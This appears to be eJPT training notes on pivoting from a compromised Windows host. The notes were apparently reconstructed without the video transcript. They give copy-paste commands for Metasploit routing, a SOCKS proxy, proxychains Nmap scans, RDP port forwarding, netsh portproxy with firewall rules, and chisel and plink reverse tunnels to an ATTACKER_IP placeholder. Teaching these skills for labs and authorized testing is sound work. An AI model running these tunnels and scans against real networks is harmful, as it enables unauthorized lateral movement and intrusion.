# What the video covers (Introduction / big picture)

Transcript not provided; the following is a conservative, standard eJPT workflow inferred from the filename and module context (04-WindowsPostExploitation).

The video covers pivoting from a compromised Windows host to reach and assess otherwise unreachable internal network segments. It demonstrates:
- Identifying internal subnets from a foothold on Windows
- Adding routes and creating a SOCKS proxy in Metasploit (Meterpreter) to scan through the pivot with proxychains
- Forwarding single ports (e.g., RDP/SMB) via Meterpreter portfwd
- Windows-native forwarding with netsh portproxy
- Alternative tunnels (e.g., chisel, plink) when Metasploit is not available

# Flow (ordered)

1. Gain a Meterpreter session on a Windows host inside the target network.
2. Enumerate network interfaces, routes, and local ARP to discover internal subnets.
3. Add pivot routes in Metasploit (autoroute/route add).
4. Stand up a SOCKS proxy in Metasploit and configure proxychains on Kali.
5. Scan internal subnets through the pivot (Nmap -sT via proxychains) and/or Metasploit scanners with Proxies set.
6. Forward specific ports (e.g., RDP 3389) using Meterpreter portfwd for direct tool access.
7. Optionally, use Windows netsh portproxy to forward ports on the pivot host itself.
8. If Metasploit is unavailable or unstable, use chisel or plink for reverse SOCKS/port forwarding.

# Tools highlighted

- Metasploit Framework
  - Meterpreter (ipconfig, shell, portfwd)
  - post/multi/manage/autoroute (or run autoroute)
  - auxiliary/server/socks_proxy (or socks4a on older setups)
  - Metasploit route command and global Proxies
- proxychains4 on Kali
- Nmap (TCP connect scan)
- Windows commands: ipconfig, route print, arp -a, netsh interface portproxy, reg add (IP forwarding)
- Optional: chisel (TCP tunnel/SOCKS over reverse connection), plink (PuTTY’s SSH client for port forwards)
- RDP client (xfreerdp), SMB tools (smbclient), etc.

# Typical command walkthrough (detailed, copy-paste friendly)

Note: Replace placeholders like 10.10.20.0/24, ATTACKER_IP, SESSION_ID, TARGET_IP as appropriate.

1) Enumerate the pivot host’s network (Meterpreter + Windows shell)
```
# In meterpreter
ipconfig
getuid
sysinfo

# Drop to a Windows shell for route/ARP info
shell
route print
arp -a
exit
```

2) Add a route for the internal subnet (choose ONE approach)

- Quick Meterpreter script:
```
# In meterpreter
run autoroute -s 10.10.20.0/24
```

- Or via Metasploit post module:
```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run
```

- Or via msfconsole route command (global):
```
# In msfconsole (not meterpreter)
route add 10.10.20.0 255.255.255.0 1
route print
```

3) Start a SOCKS proxy in Metasploit (prefer SOCKS5; fallback to SOCKS4a)

- Modern module:
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
set AUTH false
run -j
```

- Older module (if available):
```
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

4) Configure proxychains on Kali to use the SOCKS proxy
```
# Append one of the following lines to the bottom of /etc/proxychains4.conf
# Prefer SOCKS5 if you used socks_proxy VERSION 5
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# If you used socks4a:
# echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# Also ensure 'proxy_dns' is enabled in /etc/proxychains4.conf to avoid DNS leaks
sudo sed -i 's/^#*proxy_dns/proxy_dns/' /etc/proxychains4.conf
```

5) Scan the internal subnet via the pivot with Nmap (TCP connect)
```
# TCP connect scan (-sT) only; ICMP/ARP discovery won’t traverse SOCKS; use -Pn
proxychains -q nmap -sT -Pn -n -T3 -p 445,3389,80,443 10.10.20.0/24

# For service detection (slower through pivots):
proxychains -q nmap -sT -Pn -n -T2 -sV -p- 10.10.20.15
```

6) Use Metasploit scanners through the SOCKS proxy
```
# In msfconsole, set a global proxy so Ruby sockets go through SOCKS
setg Proxies socks5:127.0.0.1:1080
setg ConnectTimeout 10

use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.20.0/24
run

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.10.20.0/24
run
```

7) Forward a single remote port with Meterpreter (e.g., RDP on 3389)
```
# In meterpreter, forward remote 10.10.20.15:3389 to local 127.0.0.1:13389
portfwd add -L 127.0.0.1 -l 13389 -p 3389 -r 10.10.20.15

# Then connect locally with your tool
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:P@ssw0rd
# or: rdesktop 127.0.0.1:13389
```

8) Windows-native port forwarding with netsh portproxy (no Metasploit)
```
# Forward pivot host TCP 8080 to internal 10.10.20.50:80
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.20.50 connectport=80

# Allow inbound on Windows Defender Firewall
netsh advfirewall firewall add rule name="PortProxy 8080->10.10.20.50:80" dir=in action=allow protocol=TCP localport=8080

# Verify and remove if needed
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
```

9) Alternative: chisel reverse SOCKS/port forward (when Meterpreter is not viable)

- On attacker (Kali):
```
# Start a chisel server that accepts reverse connections
./chisel server --reverse -p 8000
```

- On pivot (Windows):
```
# Reverse SOCKS back to attacker (attacker will get a local SOCKS on 127.0.0.1:1080)
chisel.exe client ATTACKER_IP:8000 R:1080:socks
```

- On attacker (Kali), scan via the new SOCKS:
```
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains -q nmap -sT -Pn -n -p 80,445,3389 10.10.20.0/24
```

- Remote port forward example (RDP):
```
# On pivot (Windows), expose 10.10.20.15:3389 to attacker’s 127.0.0.1:13389
chisel.exe client ATTACKER_IP:8000 R:13389:10.10.20.15:3389

# On attacker, connect locally:
xfreerdp /v:127.0.0.1:13389
```

10) Alternative: plink (SSH-based remote port forward)
```
# Ensure SSH is running on attacker (Kali):
sudo systemctl start ssh

# On pivot (Windows), create a remote port forward for RDP:
plink.exe -ssh kali@ATTACKER_IP -P 22 -N -R 13389:10.10.20.15:3389

# On attacker, connect to localhost:
xfreerdp /v:127.0.0.1:13389
```

# Practical tips

- Discovery through SOCKS: Use TCP connect scans (-sT) with -Pn; avoid SYN (-sS), UDP, and ARP/ICMP-based discovery. DNS through SOCKS: enable proxy_dns in proxychains.
- Expect slower scans; reduce scope, limit ports, and tune -T to T2–T3. Validate key hosts first.
- Stability: Keep your pivot session reliable (use HTTPS/TCP transports, consider migrating the process or running as a service). Avoid killing the process hosting your session.
- Route hygiene: Only add routes you’ve confirmed exist (from ipconfig/route print). Multiple nested pivots are possible—document each route and SOCKS chain.
- Access vs scan: For a single service you need to reach (e.g., RDP/SQL), prefer portfwd or a precise chisel/plink forward over broad SOCKS scanning.
- Windows portproxy nuances: It forwards only TCP; the pivot must itself reach the target IP. Add firewall rules for the listening port and clean up entries when done.
- OPSEC basics (even in labs): Avoid noisy full -p- scans unless necessary; start with common ports.

# Minimal cheat sheet (one-screen flow)

```
# 1) Enumerate on pivot (meterpreter + shell)
ipconfig
shell
route print
arp -a
exit

# 2) Add route
run autoroute -s 10.10.20.0/24
# or: route add 10.10.20.0 255.255.255.0 1

# 3) Start SOCKS in msf
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# 4) Proxychains on Kali
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
sudo sed -i 's/^#*proxy_dns/proxy_dns/' /etc/proxychains4.conf

# 5) Scan via pivot
proxychains -q nmap -sT -Pn -n -p 80,445,3389 10.10.20.0/24

# 6) Forward RDP (meterpreter)
portfwd add -L 127.0.0.1 -l 13389 -p 3389 -r 10.10.20.15
xfreerdp /v:127.0.0.1:13389

# 7) Windows netsh portproxy (optional)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.20.50 connectport=80
netsh advfirewall firewall add rule name="PortProxy8080" dir=in action=allow protocol=TCP localport=8080
```

# Summary

Pivoting enables you to use a compromised Windows host as a bridge into internal subnets. The standard eJPT approach is:
- Identify internal networks from the pivot,
- Add routes in Metasploit,
- Expose a SOCKS proxy and use proxychains for scanning,
- Forward individual ports you need to directly access (e.g., RDP/SMB).

When Metasploit isn’t an option or you need a lighter touch, Windows netsh portproxy, chisel, and plink provide reliable alternatives. Stay mindful of the limitations of SOCKS (no raw/ARP/ICMP), scan conservatively, and prioritize stability of your pivot.